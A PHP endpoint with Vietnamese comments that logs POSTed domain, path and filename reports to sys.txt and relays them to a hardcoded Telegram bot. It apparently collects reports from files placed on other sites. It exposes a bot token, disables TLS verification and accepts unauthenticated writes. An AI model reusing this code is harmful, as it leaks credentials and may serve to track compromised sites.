<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    if (isset($data['domain'], $data['path'], $data['filename'])) {
        $domain = rtrim($data['domain'], '/'); // Đảm bảo không có dấu '/' ở cuối
        $path = ltrim($data['path'], '/'); // Đảm bảo không có dấu '/' ở đầu
        $filename = $data['filename'];
        
        // Lấy ngày giờ hiện tại
        $dateTime = date('d/m/Y H:i:s');

        // Lấy IP của server
        $serverIP = $_SERVER['SERVER_ADDR'];

        $file = 'sys.txt';
        // Tạo đường dẫn đầy đủ
        $fullPath = "$domain/$path"; // Đường dẫn đầy đủ không cần filename
        
        // Cấu trúc nội dung theo định dạng yêu cầu
        $content = "Domain: $domain\nDate: $dateTime\nServer IP: $serverIP\nFull Path: $fullPath\n";

        // Ghi vào file
        file_put_contents($file, "------\n$content", FILE_APPEND);

        // Telegram Bot Configuration - CẦN THAY ĐỔI THÔNG SỐ NÀY
        $telegramToken = '8139434527:AAF5hj9ZvZd1FOiJc7hiRohhduIgFEQzeqs'; // Thay bằng token của bot
        $telegramChatID = '7439804416'; // Thay bằng chat ID của bạn
        
        // Format message for Telegram
        $telegramMessage = "🚨 Domain Access Alert 🚨\n\n";
        $telegramMessage .= "🌐 *Domain:* `$domain`\n";
        $telegramMessage .= "📅 *Date:* $dateTime\n";
        $telegramMessage .= "🖥️ *Server IP:* `$serverIP`\n";
        $telegramMessage .= "📁 *Full Path:* `$fullPath`\n";
        $telegramMessage .= "📄 *Filename:* `$filename`";

        // Send to Telegram
        sendTelegramMessage($telegramToken, $telegramChatID, $telegramMessage);
    }
}

function sendTelegramMessage($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Log Telegram response (optional)
    if ($httpCode != 200) {
        error_log("Telegram API Error: HTTP $httpCode - " . $result);
    }
    
    return $result;
}

// Optional: Response to client
http_response_code(200);
echo json_encode(['status' => 'success', 'message' => 'Data processed and sent to Telegram']);
?>

